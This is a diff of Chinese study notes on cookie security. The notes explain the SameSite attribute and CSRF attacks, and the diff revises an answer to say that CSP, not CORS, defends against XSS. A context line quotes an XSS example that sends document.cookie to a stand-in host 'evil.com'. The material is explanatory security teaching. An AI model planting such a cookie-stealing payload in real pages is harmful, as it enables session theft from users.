@@ -27,8 +27,11 @@ eg. `<img src="http://evil.com/"+document.cookie/>`
 ## SameSite
 
 表示仅在发送请求的网站与目标网站为同一个站时, 添加Cookie
+
 **samesite的可选值:**
+
 ![](assets/Cookie安全/samesite的可选值.png)
+
 **攻击场景: csrf**
 假设用户登陆了bank.com, 保存了`cookie: sessid=<uuid>`
 用户访问了恶意网站或被xss注入js代码的网站`evil.com`, 比如
@@ -47,7 +50,7 @@ fetch("https://bank.com/transfer", {
 **question:**
 如果bank.com被xss注入js代码会怎么样?
 **A:**
-跨域检测CORS， evil.com中的js代码只能向`本网站或白名单的网站`发起请求
+靠CSP防护XSS
 
 SameSite为None时, 必须搭配Secure使用
 
